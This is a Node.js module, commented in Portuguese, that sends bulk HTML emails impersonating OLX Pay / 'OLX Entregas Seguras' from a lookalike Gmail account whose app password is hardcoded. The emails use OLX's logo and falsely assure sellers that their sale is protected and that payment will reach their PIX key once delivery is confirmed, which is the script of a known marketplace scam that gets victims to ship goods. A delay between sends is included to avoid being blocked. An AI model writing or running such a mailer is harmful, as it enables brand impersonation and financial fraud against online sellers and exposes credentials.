const nodemailer = require("nodemailer");
const fs = require("fs");
const path = require("path");

// Configuração do transporte SMTP
const transporter = nodemailer.createTransport({
  service: "gmail", // troque para seu serviço: 'gmail', 'hotmail', etc
  auth: {
    user: "olx.suportedevendas.ltdaonline@gmail.com", // seu email
    pass: "gcjt mlpl xozn ujmt", // sua senha ou senha de app
  },
});

/**
 * Função para enviar e-mail
 * @param {string} destinatario - e-mail do destinatário
 * @param {string} assunto - assunto do e-mail
 * @param {string} htmlConteudo - conteúdo em HTML do e-mail
 */
async function enviarEmail(destinatario, assunto, htmlConteudo) {
  const mailOptions = {
    from: '"Equipe OLX Pay" <olx.suportedevendas.ltdaonline@gmail.com>',
    to: destinatario,
    subject: assunto,
    html: htmlConteudo,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log(`✅ Email enviado para ${destinatario}: ${info.messageId}`);
    return true;
  } catch (error) {
    console.error(`❌ Erro ao enviar email para ${destinatario}:`, error);
    return false;
  }
}

/**
 * Função para carregar dados de vendas do arquivo JSON
 * @returns {Array} Array com dados de vendas
 */
function carregarDadosVendas() {
  try {
    const caminhoArquivo = path.join(__dirname, "../data/vendas.json");
    const dados = fs.readFileSync(caminhoArquivo, "utf8");
    return JSON.parse(dados);
  } catch (error) {
    console.error("Erro ao carregar dados de vendas:", error);
    return [];
  }
}

/**
 * Função para enviar e-mails em massa para uma lista de destinatários
 * @param {Array} listaEmails - lista de e-mails destinatários
 * @param {string} codigoProduto - (opcional) código específico do produto
 * @param {string} rastreioManual - (opcional) código de rastreio digitado manualmente
 * @param {string} nomeTransportadora - (opcional) nome da transportadora digitado manualmente
 * @param {string} assuntoPersonalizado - (opcional) assunto personalizado do e-mail
 */
async function enviarEmMassa(
  listaEmails,
  codigoProduto = null,
  rastreioManual = null,
  nomeTransportadora = null,
  assuntoPersonalizado = null
) {
  const dadosVendas = carregarDadosVendas();

  if (dadosVendas.length === 0) {
    console.error(
      "Não foi possível carregar dados de produtos para o envio em massa"
    );
    return;
  }

  // Seleciona o produto
  const produto = codigoProduto
    ? dadosVendas.find((p) => p.codigo === codigoProduto)
    : dadosVendas[0];

  if (!produto) {
    console.error(`Produto com código ${codigoProduto} não encontrado`);
    return;
  }

  const { codigo: codigoVenda, produto: nomeProduto, comprador: nomeComprador } = produto;

  // Use rastreio e transportadora manual se fornecidos, caso contrário use valores do JSON ou padrão
  const rastreio = rastreioManual || produto.rastreio || "";
  const transportadora = nomeTransportadora || produto.transportadora || "";

  let enviados = 0;
  let falhas = 0;

  const assunto =
    assuntoPersonalizado ||
    `OLX Pay - Confirmação de Pagamento e Envio para ${nomeProduto}`;

  console.log(
    `Iniciando envio em massa para ${listaEmails.length} destinatários...`
  );
  console.log(`Produto: ${nomeProduto} (${codigoVenda}) | Rastreio: ${rastreio}`);

  for (const email of listaEmails) {
    const mensagemHTML = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px; background-color: #f9f9f9;">
        <div style="text-align: center; margin-bottom: 20px;">
          <img src="https://static.olx.com.br/external/base/img/olx-logo.png" alt="OLX Logo" style="height: 50px;">
        </div>
        <h2 style="color: #333;">📦 Produto Enviado – Aguardando Entrega</h2>
        <p>Olá,</p>
        <p>Informamos que o envio do produto foi realizado com sucesso via <strong>${transportadora}</strong>` +
      (rastreio ? `, utilizando o código de rastreio: <strong>${rastreio}</strong>.` : `.`) + `</p>
        <p>No momento, o rastreamento indica que o item <strong>ainda não saiu da transportadora</strong>. Mas não se preocupe — todo o processo está sendo monitorado pela nossa plataforma.</p>
        <hr style="border: none; border-top: 1px solid #ccc;" />
        <p><strong>🛡️ Compra 100% Segura</strong><br>
          Essa venda está sendo realizada por meio do sistema <strong>OLX Entregas Seguras</strong>, que garante total proteção para ambas as partes. O valor da venda já foi reservado e será automaticamente liberado assim que a entrega for confirmada.</p>
        <p><strong>🔒 Transação Sigilosa</strong><br>
          Todos os dados envolvidos na transação são tratados com sigilo e segurança. Nem o comprador, nem o vendedor têm acesso a dados sensíveis um do outro. Utilizamos criptografia e monitoramento contínuo para evitar fraudes ou interferências externas.</p>
        <p>O valor da venda será depositado diretamente na sua <strong>chave PIX cadastrada</strong> assim que a entrega for concluída.</p>
        <div style="text-align: center; margin: 30px 0;">
          ${rastreio ? `<a href="https://rastreamento.correios.com.br/" target="_blank" style="background-color: #4CAF50; color: white; padding: 12px 20px; text-decoration: none; border-radius: 5px; display: inline-block;">📍 Acompanhar Rastreio</a>` : ``}
        </div>
        <p>Seguimos acompanhando o processo de entrega para garantir que tudo ocorra com transparência, proteção e eficiência. Caso haja qualquer intercorrência, nossa equipe de suporte está à disposição para te ajudar.</p>
        <p style="color: #555; font-size: 14px;">Atenciosamente,<br><strong>Equipe de Suporte</strong><br>OLX Entregas Seguras</p>
      </div>
    `;

    const resultado = await enviarEmail(email, assunto, mensagemHTML);
    if (resultado) enviados++;
    else falhas++;

    // Delay para evitar bloqueios
    await new Promise((res) => setTimeout(res, 1500));
  }

  console.log(`
  ✅ Envio em massa concluído:
  - E-mails enviados com sucesso: ${enviados}
  - Falhas no envio: ${falhas}
  - Total de tentativas: ${listaEmails.length}
  `);
}

module.exports = {
  enviarEmail,
  enviarEmMassa,
  carregarDadosVendas,
};
